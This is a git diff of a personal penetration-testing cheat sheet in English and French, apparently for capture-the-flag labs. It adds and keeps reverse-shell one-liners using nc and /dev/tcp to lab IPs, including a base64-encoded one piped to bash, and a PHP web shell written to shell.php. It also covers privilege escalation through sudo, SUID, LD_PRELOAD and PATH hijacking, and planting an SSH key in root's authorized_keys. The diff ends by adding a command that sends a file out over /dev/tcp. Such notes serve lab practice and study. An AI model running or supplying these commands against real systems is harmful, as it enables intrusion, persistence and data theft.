@@ -16,7 +16,7 @@ rlwrap nc -lvnp 1234
 bash -i >& /dev/tcp/@IP/1234 0>&1
 ``` 
 ```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.17.161 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.16.108 1234 >/tmp/f
 ```
 ### can encode payload in Base64 
 marche pour les formulaire
@@ -28,11 +28,10 @@ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjEvMTIzNCAwPiYx | base64 -d | bash
 ```
 ## _Create end send a reverse shell php file to webvictim_
 ```
-echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.201.1.201 1234 >/tmp/f"); ?>' > shell.php
+echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.108 1234 >/tmp/f"); ?>' > shell.php
 ```
 ```
-echo "<?php system("bash -c 'bash -i >& /dev/tcp/10.201.1.201/1234 0>&1'```
-");?>" > shell.php
+echo "<?php system("bash -c 'bash -i >& /dev/tcp/10.201.1.201/1234 0>&1'");?>" > shell.php
 ```
 ## _form post_
 ```
@@ -45,85 +44,9 @@ curl 'http://remote@ip' -X POST -d 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%
 ufw allow from adresseip proto tcp to any port 80,443
 ```
 
-# foothold enum
-## *update shell*
-```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-script /dev/null -c bash
-^Z
-stty raw -echo; fg
-reset 
-screen
-```
-
-```
-python -c 'import pty;pty.spawn("/bin/bash");'  
-ctrl z  
-echo $TERM  
-stty -a  
-stty raw -echo  
-fg  
-
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
-export TERM=xterm256-color  
-export SHELL=bash  
-
-stty rows \<> colums \<>  
-```
-
-## Automated script
-```
-linPEAS.sh
-LinEnum.sh
-linuxprivchecker.py
-unix-privesc-check
-Mestaploit: multi/recon/local_exploit_suggester
-
-```
-### GTFONow
-https://github.com/Frissi0n/GTFONow
-### lse
-https://github.com/diego-treitos/linux-smart-enumeration
-## _distrib info_
-```
-lsb_release -a
-```
-
-```
-sudo -l
-```
-## _find SUID files_
-```
-find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
-
-```
-## _user's files_
-```
-find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
-```
-## _users_ (display lines finished by sh)
-```
-cat /etc/passwd | grep sh$
-
-```
-## _ExploitCapability_
-```
-getcap -r / 2>/dev/null
-```
-## *con.d*
-```
-ls -la /etc/cron.d
-
-```
-## _search ps log_
-```
-./pspy
-```
-|
 # Privilege Escalation Linux
 ```
 bash -p
-
 ```
 	| `sudo -l` | List available `sudo` privileges |
 	| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
@@ -133,8 +56,8 @@ bash -p
 	| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
 	| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |
 
-## SUID script
-### Exploit absolute path
+## SUID / SUDO
+### Exploit absolute path env #ExploitNotAbsolutPath 
 ```
 % cat change-pass 
 #!/bin/ksh user=$1 
@@ -153,7 +76,7 @@ $ export PATH=/hack/path:$PATH
 $ echo $PATH
 ```
 
-###  script content : system("/bin/bash");
+###  script content : system("/bin/bash"); #ExploitBASHENV
 ```
 mkdir /tmp/mych13  
 echo "cat .passwd" > /tmp/mych13/startup.sh  
@@ -168,6 +91,22 @@ Par exemple, si vous avez un fichier de configuration spécifique pour vos scrip
 
 ```
 cat /tmp/toto - |./script
+```
+
+### Si le résultat de `sudo -l` contient ``env_keep+=LD_PRELOAD`` ou ``(root) SETENV: NOPASSWD: /opt/monitor.sh``
+
+`SETENV:`: Autorise l'utilisateur à utiliser l'option `-E` ou `--preserve-env` avec sudo, ce qui permet de préserver l'environnement de l'utilisateur lors de l'exécution de la commande.
+En utilisant `LD_PRELOAD`, vous pouvez forcer un programme à utiliser des versions spécifiques de fonctions, même si celles-ci ne font pas partie des bibliothèques standard du système.
+```bash
+gcc -shared exp -o exp -nostartfiles
+```
+$
+```bash
+LD_PRELOAD=/tmp/exploit ./program
+```
+pour le proxy_chain
+``` bash
+sudo http_proxy=http://10.10.16.108:1234 /opt/monitor.sh
 ```
 
 # Transferring Files
@@ -215,4 +154,7 @@ nc -lvp port > file
 ```
 nc -w 3 l@ip port < file
 ``` 
+```
+cat /opt/manage/execute_query > /dev/tcp/10.10.16.108/4321
+```
 
